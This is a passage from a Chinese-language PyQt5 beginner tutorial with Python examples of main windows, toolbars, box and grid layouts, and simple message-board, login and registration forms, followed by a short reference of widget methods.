然后，通过move函数，把主窗口的左上角，移到主窗口框架的左上角哎，完成居中</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app = QApplication(sys.argv)	<span class="comment"># 创建应用</span></span><br><span class="line">    qs = QuickStart()				<span class="comment"># 创建窗口对象</span></span><br><span class="line">    sys.exit(app.exec_())			<span class="comment"># 应用主循环开始</span></span><br></pre></td></tr></table></figure>

<p><img src="/../../pic/Learning-Python/pyqt5/5-toolbar.png" alt="5-toolbar"></p>
<p>当QAction设置了图标时，工具栏优先使用图标，没有图标时，再使用文字。</p>
<h3 id="主窗口"><a href="#主窗口" class="headerlink" title="主窗口"></a>主窗口</h3><p>封装一个App类，QuickStartApp.py</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">from</span> PyQt5.QtWidgets <span class="keyword">import</span> QMainWindow, QMenu, QAction, qApp, QApplication</span><br><span class="line"><span class="keyword">from</span> PyQt5.QtWidgets <span class="keyword">import</span> QMessageBox, QToolTip, QPushButton, QDesktopWidget</span><br><span class="line"><span class="keyword">from</span> PyQt5.QtCore <span class="keyword">import</span> QCoreApplication</span><br><span class="line"><span class="keyword">from</span> PyQt5.QtGui <span class="keyword">import</span> QIcon, QFont</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">QuickStartApp</span>(<span class="title class_ inherited__">QMainWindow</span>):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="built_in">super</span>().__init__()</span><br><span class="line">        self.setWindowIcon(QIcon(<span class="string">&quot;logo.png&quot;</span>))</span><br><span class="line">        self.resize(<span class="number">800</span>, <span class="number">600</span>)</span><br><span class="line">        self.center()</span><br><span class="line">        self.show()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">closeEvent</span>(<span class="params">self, event</span>):</span><br><span class="line">        isExit = QMessageBox.question(</span><br><span class="line">            self, <span class="string">&quot;退出确认&quot;</span>, <span class="string">&quot;您确定要退出程序吗？&quot;</span>,</span><br><span class="line">            QMessageBox.Yes | QMessageBox.No,</span><br><span class="line">            QMessageBox.No</span><br><span class="line">        )</span><br><span class="line">        <span class="keyword">if</span> isExit == QMessageBox.Yes:</span><br><span class="line">            event.accept()</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            event.ignore()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">center</span>(<span class="params">self</span>):</span><br><span class="line">        frame = self.frameGeometry()</span><br><span class="line">        screen_enter = QDesktopWidget().availableGeometry().center()</span><br><span class="line">        frame.moveCenter(screen_enter)</span><br><span class="line">        self.move(frame.topLeft())</span><br></pre></td></tr></table></figure>

<p>main.py</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">from</span> PyQt5.QtWidgets <span class="keyword">import</span> QMainWindow, QMenu, QAction, qApp, QApplication, QDesktopWidget</span><br><span class="line"><span class="keyword">from</span> PyQt5.QtWidgets <span class="keyword">import</span> QMessageBox, QToolTip, QPushButton, QTextEdit</span><br><span class="line"><span class="keyword">from</span> PyQt5.QtCore <span class="keyword">import</span> QCoreApplication</span><br><span class="line"><span class="keyword">from</span> PyQt5.QtGui <span class="keyword">import</span> QIcon, QFont</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> QuickStartApp <span class="keyword">import</span> QuickStartApp</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">App</span>(<span class="title class_ inherited__">QuickStartApp</span>):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="built_in">super</span>().__init__()</span><br><span class="line">        self.initUI()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">initUI</span>(<span class="params">self</span>):</span><br><span class="line">        self.setWindowTitle(<span class="string">&quot;演示主窗口的使用&quot;</span>)</span><br><span class="line"></span><br><span class="line">        text_edit = QTextEdit() <span class="comment"># 创建一个文本编辑框</span></span><br><span class="line">        self.setCentralWidget(text_edit) <span class="comment"># 占满整个主窗口</span></span><br><span class="line"></span><br><span class="line">        self.getMenuBar() <span class="comment"># 添加菜单栏</span></span><br><span class="line">        self.getStatusBar() <span class="comment"># 添加状态栏</span></span><br><span class="line">        self.getToolBar() <span class="comment"># 添加工具栏</span></span><br><span class="line"></span><br><span class="line">        self.show()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">getMenuBar</span>(<span class="params">self</span>):</span><br><span class="line">        menu_bar = self.menuBar()</span><br><span class="line">        file_menu = menu_bar.addMenu(<span class="string">&quot;&amp;文件&quot;</span>)</span><br><span class="line">        file_menu.addAction(self.getExitAction())</span><br><span class="line">        <span class="comment"># view_menu = menu_bar.addMenu(&quot;&amp;查看&quot;)</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">getExitAction</span>(<span class="params">self</span>):</span><br><span class="line">        exit_action = QAction(<span class="string">&quot;退出&quot;</span>, self)</span><br><span class="line">        exit_action.setShortcut(<span class="string">&quot;Ctrl+Q&quot;</span>)</span><br><span class="line">        exit_action.setStatusTip(<span class="string">&quot;退出程序&quot;</span>)</span><br><span class="line">        exit_action.triggered.connect(self.close)</span><br><span class="line">        <span class="keyword">return</span> exit_action</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">getStatusBar</span>(<span class="params">self</span>):</span><br><span class="line">        self.statusBar().showMessage(<span class="string">&quot;状态栏&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">getToolBar</span>(<span class="params">self</span>):</span><br><span class="line">        tool_bar = self.addToolBar(<span class="string">&quot;退出&quot;</span>)</span><br><span class="line">        tool_bar.addAction(self.getExitAction()) <span class="comment"># 内存中出现两份exit_action，可以优化</span></span><br><span class="line">    </span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    app = QApplication(sys.argv)</span><br><span class="line">    qs = App()</span><br><span class="line">    sys.exit(app.exec_())</span><br></pre></td></tr></table></figure>

<h3 id="绝对定位"><a href="#绝对定位" class="headerlink" title="绝对定位"></a>绝对定位</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">from</span> PyQt5.QtWidgets <span class="keyword">import</span> QApplication, QLabel</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> QuickStartApp <span class="keyword">import</span> QuickStartApp</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">App</span>(<span class="title class_ inherited__">QuickStartApp</span>):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="built_in">super</span>().__init__()</span><br><span class="line">        self.initUI()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">initUI</span>(<span class="params">self</span>):</span><br><span class="line">        label1 = QLabel(<span class="string">&quot;label1&quot;</span>, self)</span><br><span class="line">        label1.move(<span class="number">33</span>, <span class="number">10</span>)		<span class="comment"># 绝对定位</span></span><br><span class="line">        label1.show()</span><br><span class="line"></span><br><span class="line">        label2 = QLabel(<span class="string">&quot;label2&quot;</span>, self)</span><br><span class="line">        label2.move(<span class="number">66</span>, <span class="number">30</span>)</span><br><span class="line">        label2.show()</span><br><span class="line">        </span><br><span class="line">        label3 = QLabel(<span class="string">&quot;label3&quot;</span>, self)</span><br><span class="line">        label3.move(<span class="number">99</span>, <span class="number">60</span>)</span><br><span class="line">        label3.show()</span><br><span class="line"></span><br><span class="line">        self.setWindowTitle(<span class="string">&quot;绝对定位&quot;</span>)</span><br><span class="line">        self.show()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    app = QApplication(sys.argv)</span><br><span class="line">    qs = App()</span><br><span class="line">    sys.exit(app.exec_())</span><br></pre></td></tr></table></figure>

<h3 id="盒布局"><a href="#盒布局" class="headerlink" title="盒布局"></a>盒布局</h3><p>盒布局有更强的适应性</p>
<ul>
<li>水平布局 - QHBoxLayout</li>
<li>垂直布局 - QVBoxLayout</li>
<li>添加弹性空间 - addStretch</li>
</ul>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">from</span> PyQt5.QtWidgets <span class="keyword">import</span> QApplication, QPushButton, QHBoxLayout, QVBoxLayout, QWidget</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">App</span>(<span class="title class_ inherited__">QWidget</span>):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="built_in">super</span>().__init__()</span><br><span class="line">        self.initUI()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">initUI</span>(<span class="params">self</span>):</span><br><span class="line">        button_ok = QPushButton(<span class="string">&quot;确认&quot;</span>, self)</span><br><span class="line">        button_cancel = QPushButton(<span class="string">&quot;取消&quot;</span>, self)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># 创建水平布局盒子</span></span><br><span class="line">        hbox = QHBoxLayout()    </span><br><span class="line">        hbox.addStretch(<span class="number">1</span>)	<span class="comment"># 在按钮前添加弹性控件</span></span><br><span class="line">        hbox.addWidget(button_ok)</span><br><span class="line">        hbox.addWidget(button_cancel)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># 创建垂直布局盒子</span></span><br><span class="line">        vbox = QVBoxLayout()</span><br><span class="line">        vbox.addStretch(<span class="number">1</span>) <span class="comment"># 在hbox上面添加弹性空间</span></span><br><span class="line">        vbox.addLayout(hbox)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># 设置布局</span></span><br><span class="line">        self.setLayout(vbox)</span><br><span class="line"></span><br><span class="line">        self.setWindowTitle(<span class="string">&quot;盒布局&quot;</span>)</span><br><span class="line">        self.show()</span><br><span class="line">        </span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    app = QApplication(sys.argv)</span><br><span class="line">    qs = App()</span><br><span class="line">    sys.exit(app.exec_())</span><br></pre></td></tr></table></figure>

<p><img src="/../../pic/Learning-Python/pyqt5/6-boxlayout.png" alt="6-boxlayout"></p>
<h3 id="栅格布局"><a href="#栅格布局" class="headerlink" title="栅格布局"></a>栅格布局</h3><p>栅格布局是最常用的布局，它把窗口分为行和列。</p>
<p>使用QGridLayout模块创建和使用栅格布局。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">from</span> PyQt5.QtWidgets <span class="keyword">import</span> QApplication, QPushButton, QGridLayout, QWidget</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">App</span>(<span class="title class_ inherited__">QWidget</span>):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="built_in">super</span>().__init__()</span><br><span class="line">        self.initUI()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">initUI</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="comment"># 设置布局为栅格布局</span></span><br><span class="line">        grid = QGridLayout()</span><br><span class="line">        self.setLayout(grid)</span><br><span class="line"></span><br><span class="line">        names = [<span class="string">&#x27;重置&#x27;</span>, <span class="string">&#x27;删除&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="string">&#x27;关闭&#x27;</span>,</span><br><span class="line">                 <span class="string">&#x27;7&#x27;</span>, <span class="string">&#x27;8&#x27;</span>, <span class="string">&#x27;9&#x27;</span>, <span class="string">&#x27;/&#x27;</span>,</span><br><span class="line">                 <span class="string">&#x27;4&#x27;</span>, <span class="string">&#x27;5&#x27;</span>, <span class="string">&#x27;6&#x27;</span>, <span class="string">&#x27;*&#x27;</span>,</span><br><span class="line">                 <span class="string">&#x27;1&#x27;</span>, <span class="string">&#x27;2&#x27;</span>, <span class="string">&#x27;3&#x27;</span>, <span class="string">&#x27;-&#x27;</span>,</span><br><span class="line">                 <span class="string">&#x27;0&#x27;</span>, <span class="string">&#x27;.&#x27;</span>, <span class="string">&#x27;=&#x27;</span>, <span class="string">&#x27;+&#x27;</span>]</span><br><span class="line">        positions = [(i, j) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">5</span>) <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4</span>)]</span><br><span class="line">        <span class="keyword">for</span> position, name <span class="keyword">in</span> <span class="built_in">zip</span>(positions, names):</span><br><span class="line">            <span class="built_in">print</span>(position, name)</span><br><span class="line">            <span class="keyword">if</span> name == <span class="string">&#x27;&#x27;</span>:</span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line">            button = QPushButton(name)</span><br><span class="line">            grid.addWidget(button, *position) <span class="comment"># *用于元组解包</span></span><br><span class="line"></span><br><span class="line">        self.setWindowTitle(<span class="string">&quot;栅格布局&quot;</span>)</span><br><span class="line">        self.show()</span><br><span class="line">        </span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    app = QApplication(sys.argv)</span><br><span class="line">    qs = App()</span><br><span class="line">    sys.exit(app.exec_())</span><br></pre></td></tr></table></figure>

<p><img src="/../../pic/Learning-Python/pyqt5/7-gridlayout.png" alt="7-gridlayout"></p>
<h3 id="留言板"><a href="#留言板" class="headerlink" title="留言板"></a>留言板</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> PyQt5.QtGui <span class="keyword">import</span> QIcon</span><br><span class="line"><span class="keyword">from</span> PyQt5.QtWidgets <span class="keyword">import</span> (</span><br><span class="line">    QWidget, QLabel, QLineEdit, QTextEdit, QGridLayout, QApplication</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">QuickStart</span>(<span class="title class_ inherited__">QWidget</span>):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="built_in">super</span>().__init__()</span><br><span class="line">        self.initUI()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">initUI</span>(<span class="params">self</span>):</span><br><span class="line">        self.setWindowTitle(<span class="string">&quot;留言板&quot;</span>)</span><br><span class="line">        self.setWindowIcon(QIcon(<span class="string">&quot;favicon.ico&quot;</span>))</span><br><span class="line">        <span class="comment"># 三个提示文本</span></span><br><span class="line">        title = QLabel(<span class="string">&quot;标题&quot;</span>)</span><br><span class="line">        author = QLabel(<span class="string">&quot;作者&quot;</span>)</span><br><span class="line">        review = QLabel(<span class="string">&quot;留言&quot;</span>)</span><br><span class="line">        <span class="comment"># 三个输入框</span></span><br><span class="line">        titleEdit = QLineEdit()</span><br><span class="line">        authorEdit = QLineEdit()</span><br><span class="line">        reviewEdit = QTextEdit()</span><br><span class="line"></span><br><span class="line">        <span class="comment"># 创建栅格布局</span></span><br><span class="line">        grid = QGridLayout()</span><br><span class="line">        grid.setSpacing(<span class="number">10</span>)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># 将组建添加到栅格中</span></span><br><span class="line">        grid.addWidget(title, <span class="number">1</span>, <span class="number">0</span>)</span><br><span class="line">        grid.addWidget(author, <span class="number">2</span>, <span class="number">0</span>)</span><br><span class="line">        grid.addWidget(review, <span class="number">3</span>, <span class="number">0</span>)</span><br><span class="line">        grid.addWidget(titleEdit, <span class="number">1</span>, <span class="number">1</span>)</span><br><span class="line">        grid.addWidget(authorEdit, <span class="number">2</span>, <span class="number">1</span>)</span><br><span class="line">        grid.addWidget(reviewEdit, <span class="number">3</span>, <span class="number">1</span>, <span class="number">5</span>, <span class="number">1</span>)	<span class="comment"># 跨5行，1列</span></span><br><span class="line"></span><br><span class="line">        <span class="comment"># 设置布局</span></span><br><span class="line">        self.setLayout(grid)</span><br><span class="line">        self.resize(<span class="number">800</span>, <span class="number">600</span>)</span><br><span class="line">        self.move(<span class="number">300</span>, <span class="number">300</span>)</span><br><span class="line">        self.show()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app = QApplication(sys.argv)</span><br><span class="line">    qs = QuickStart()</span><br><span class="line">    sys.exit(app.exec_())</span><br></pre></td></tr></table></figure>

<p><img src="/../../pic/Learning-Python/pyqt5/8-%E7%95%99%E8%A8%80%E6%9D%BF.png" alt="8-留言板"></p>
<h3 id="登录界面"><a href="#登录界面" class="headerlink" title="登录界面"></a>登录界面</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># _*_ coding:UTF-8 _*_</span></span><br><span class="line"><span class="comment"># 开发人员: 理想国真恵玩-张大鹏</span></span><br><span class="line"><span class="comment"># 开发团队: 理想国真恵玩</span></span><br><span class="line"><span class="comment"># 开发时间: 2019/11/20 19:49</span></span><br><span class="line"><span class="comment"># 文件名称: 17登录界面.py</span></span><br><span class="line"><span class="comment"># 开发工具: PyCharm</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">from</span> PyQt5.QtWidgets <span class="keyword">import</span> (</span><br><span class="line">    QWidget, QLabel, QLineEdit, QTextEdit, QGridLayout, QApplication,</span><br><span class="line">    QToolTip, QPushButton</span><br><span class="line">)</span><br><span class="line"><span class="keyword">from</span> PyQt5.QtGui <span class="keyword">import</span> (</span><br><span class="line">    QIcon, QFont,</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">QucikStart</span>(<span class="title class_ inherited__">QWidget</span>):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="built_in">super</span>().__init__()</span><br><span class="line">        self.initUI()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">initUI</span>(<span class="params">self</span>):</span><br><span class="line">        QToolTip.setFont(QFont(<span class="string">&quot;simHei&quot;</span>, <span class="number">12</span>))</span><br><span class="line">        <span class="comment"># 创建栅格布局</span></span><br><span class="line">        grid = QGridLayout()</span><br><span class="line">        grid.setSpacing(<span class="number">10</span>)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># 用户名</span></span><br><span class="line">        username = QLabel(<span class="string">&quot;用户名&quot;</span>)</span><br><span class="line">        usernameEdit = QLineEdit()</span><br><span class="line">        grid.addWidget(username, <span class="number">1</span>, <span class="number">0</span>)</span><br><span class="line">        grid.addWidget(usernameEdit, <span class="number">1</span>, <span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># 密码</span></span><br><span class="line">        password = QLabel(<span class="string">&quot;密码&quot;</span>)</span><br><span class="line">        passwordEdit = QLineEdit()</span><br><span class="line">        grid.addWidget(password, <span class="number">2</span>, <span class="number">0</span>)</span><br><span class="line">        grid.addWidget(passwordEdit, <span class="number">2</span>, <span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># 登录按钮</span></span><br><span class="line">        loginButton = QPushButton(<span class="string">&quot;登录&quot;</span>)</span><br><span class="line">        loginButton.setToolTip(<span class="string">&quot;点击登录&quot;</span>)</span><br><span class="line">        grid.addWidget(loginButton, <span class="number">3</span>, <span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># 设置窗口布局</span></span><br><span class="line">        self.setLayout(grid)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># 窗口</span></span><br><span class="line">        self.setWindowIcon(QIcon(<span class="string">&quot;logo.png&quot;</span>))</span><br><span class="line">        self.setWindowTitle(<span class="string">&quot;用户登录&quot;</span>)</span><br><span class="line">        self.resize(<span class="number">300</span>, <span class="number">200</span>)</span><br><span class="line">        self.move(<span class="number">300</span>, <span class="number">300</span>)</span><br><span class="line">        self.show()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app = QApplication(sys.argv)</span><br><span class="line">    qs = QucikStart()</span><br><span class="line">    sys.exit(app.exec_())</span><br></pre></td></tr></table></figure>

<p><img src="/../../pic/Learning-Python/pyqt5/9-login.png" alt="9-login"></p>
<h3 id="注册界面"><a href="#注册界面" class="headerlink" title="注册界面"></a>注册界面</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">from</span> PyQt5.QtWidgets <span class="keyword">import</span> (</span><br><span class="line">    QWidget, QLabel, QLineEdit, QGridLayout, QApplication,</span><br><span class="line">    QToolTip, QPushButton</span><br><span class="line">)</span><br><span class="line"><span class="keyword">from</span> PyQt5.QtGui <span class="keyword">import</span> (</span><br><span class="line">    QIcon, QFont,</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">QuickStart</span>(<span class="title class_ inherited__">QWidget</span>):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="built_in">super</span>().__init__()</span><br><span class="line">        self.initUI()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">initUI</span>(<span class="params">self</span>):</span><br><span class="line">        QToolTip.setFont(QFont(<span class="string">&quot;simHei&quot;</span>, <span class="number">12</span>))</span><br><span class="line">        <span class="comment"># 创建栅格布局</span></span><br><span class="line">        grid = QGridLayout()</span><br><span class="line">        grid.setSpacing(<span class="number">10</span>)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># 用户名</span></span><br><span class="line">        username = QLabel(<span class="string">&quot;用户名&quot;</span>)</span><br><span class="line">        usernameEdit = QLineEdit()</span><br><span class="line">        grid.addWidget(username, <span class="number">1</span>, <span class="number">0</span>)</span><br><span class="line">        grid.addWidget(usernameEdit, <span class="number">1</span>, <span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># 密码</span></span><br><span class="line">        password = QLabel(<span class="string">&quot;密码&quot;</span>)</span><br><span class="line">        passwordEdit = QLineEdit()</span><br><span class="line">        grid.addWidget(password, <span class="number">2</span>, <span class="number">0</span>)</span><br><span class="line">        grid.addWidget(passwordEdit, <span class="number">2</span>, <span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># 确认密码</span></span><br><span class="line">        password1 = QLabel(<span class="string">&quot;确认密码&quot;</span>)</span><br><span class="line">        password1Edit = QLineEdit()</span><br><span class="line">        grid.addWidget(password1, <span class="number">3</span>, <span class="number">0</span>)</span><br><span class="line">        grid.addWidget(password1Edit, <span class="number">3</span>, <span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># 登录按钮</span></span><br><span class="line">        loginButton = QPushButton(<span class="string">&quot;注册&quot;</span>)</span><br><span class="line">        loginButton.setToolTip(<span class="string">&quot;点击注册&quot;</span>)</span><br><span class="line">        grid.addWidget(loginButton, <span class="number">4</span>, <span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># 设置窗口布局</span></span><br><span class="line">        self.setLayout(grid)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># 窗口</span></span><br><span class="line">        self.setWindowIcon(QIcon(<span class="string">&quot;logo.png&quot;</span>))</span><br><span class="line">        self.setWindowTitle(<span class="string">&quot;用户注册&quot;</span>)</span><br><span class="line">        self.resize(<span class="number">300</span>, <span class="number">200</span>)</span><br><span class="line">        self.move(<span class="number">300</span>, <span class="number">300</span>)</span><br><span class="line">        self.show()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app = QApplication(sys.argv)</span><br><span class="line">    qs = QuickStart()</span><br><span class="line">    sys.exit(app.exec_())</span><br></pre></td></tr></table></figure>

<p><img src="/../../pic/Learning-Python/pyqt5/10-registry.png" alt="10-registry"></p>
<h2 id="基础知识"><a href="#基础知识" class="headerlink" title="基础知识"></a>基础知识</h2><h3 id="基础控件"><a href="#基础控件" class="headerlink" title="基础控件"></a>基础控件</h3><h4 id="QWidget"><a href="#QWidget" class="headerlink" title="QWidget"></a>QWidget</h4><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">.resize()</span><br><span class="line">.move()</span><br><span class="line">.setGeometry()</span><br><span class="line">.setWindowTitle()</span><br><span class="line">.setWindowIcon()</span><br><span class="line">.setToolTip()</span><br><span class="line">.frameGeometry() # 获取控件所在框架的QRect</span><br></pre></td></tr></table></figure>

<h4 id="QMainWindow"><a href="#QMainWindow" class="headerlink" title="QMainWindow"></a>QMainWindow</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">.statusBar() .showMessage(&quot;&quot;)</span><br><span class="line">.menuBar() .addMenu() .addAction() # 由于存在函数重载，.addMenu()的参数可以是QMenu，也可以是字符串</span><br><span class="line">.setCentralWidget()</span><br><span class="line">.close() # 产生QCloseEvent事件，调用closeEvent()世事件处理函数</span><br></pre></td></tr></table></figure>

<h4 id="QMenu"><a href="#QMenu" class="headerlink" title="QMenu"></a>QMenu</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">.addMenu()</span><br><span class="line">.addAction()</span><br><span class="line">.exec_(QPoint) # 在某个位置显示菜单，返回值类型为QAction</span><br></pre></td></tr></table></figure>

<h4 id="QAction"><a href="#QAction" class="headerlink" title="QAction"></a>QAction</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">QAction(QIcon(&quot;exit.png&quot;), &quot;&amp;退出&quot;, self)</span><br><span class="line">.setStatusTip()</span><br><span class="line">.setShortcut()</span><br><span class="line">.triggered.connect()</span><br><span class="line">.setCheckable()	# 创建一个可选中的行为项</span><br><span class="line">.setChecked()	# True：默认选中</span><br></pre></td></tr></table></figure>

<h4 id="QPushButton"><a href="#QPushButton" class="headerlink" title="QPushButton"></a>QPushButton</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">QPushButton(string text, QWidget paren=None) # text是按钮上的文字，第二个参数是为按钮指定的父级对象 </span><br><span class="line">.setToolTip()</span><br><span class="line">.resize()	# python存在函数重载，所以.resize既可以接收w,h两个整型参数，也可以接收PyQt5.QtCore.QSize(w,h)对象</span><br><span class="line">.sizeHint()	# 返回默认的按钮大小</span><br><span class="line">.move()</span><br></pre></td></tr></table></figure>

<h4 id="QTextEdit"><a href="#QTextEdit" class="headerlink" title="QTextEdit"></a>QTextEdit</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"></span><br></pre></td></tr></table></figure>

<h4 id="QLineEdit"><a href="#QLineEdit" class="headerlink" title="QLineEdit"></a>QLineEdit</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"></span><br></pre></td></tr></table></figure>

<h4 id="QLabel"><a href="#QLabel" class="headerlink" title="QLabel"></a>QLabel</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"></span><br></pre></td></tr></table></figure>

<h4 id="QToolTip"><a href="#QToolTip" class="headerlink" title="QToolTip"></a>QToolTip</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">QToolTip.setFont() # 静态方法，设置提示框的字体</span><br></pre></td></tr></table></figure>

<h4 id="QCoreApplication"><a href="#QCoreApplication" class="headerlink" title="QCoreApplication"></a>QCoreApplication</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">.instance().quit()</span><br></pre></td></tr></table></figure>

<h4 id="QMessageBox"><a href="#QMessageBox" class="headerlink" title="QMessageBox"></a>QMessageBox</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">.question(parent, title, text, optional_buttons, default_button) - QMessageBox.Yes | QMessageBox.No</span><br></pre></td></tr></table></figure>

<h4 id="QDesktopWidget"><a href="#QDesktopWidget" class="headerlink" title="QDesktopWidget"></a>QDesktopWidget</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">.availableGeometry() # 获取屏幕对应的QRec</span><br></pre></td></tr></table></figure>

<h4 id="xxxLayout"><a href="#xxxLayout" class="headerlink" title="xxxLayout"></a>xxxLayout</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">.addWidget()</span><br><span class="line">.setSpacing() # 设置控件的上下间距</span><br></pre></td></tr></table></figure>

<h3 id="基本事件"><a href="#基本事件" class="headerlink" title="基本事件"></a>基本事件</h3><h4 id="closeEvent"><a href="#closeEvent" class="headerlink" title="closeEvent"></a>closeEvent</h4><ul>
<li>窗口关闭事件</li>
</ul>
<h4 id="contextMenuEvent"><a href="#contextMenuEvent" class="headerlink" title="contextMenuEvent"></a>contextMenuEvent</h4><ul>
<li>右键菜单事件</li>
</ul>
<h3 id="注意点"><a href="#注意点" class="headerlink" title="注意点"></a>注意点</h3><p>QMainWindow中，不能直接放按钮之类的组件，QWidget可以。</p>
]]></content>
      <categories>
        <category>Learning-Python</category>
      </categories>
      <tags>
        <tag>PyQt5</tag>
      </tags>
  </entry>
</search>
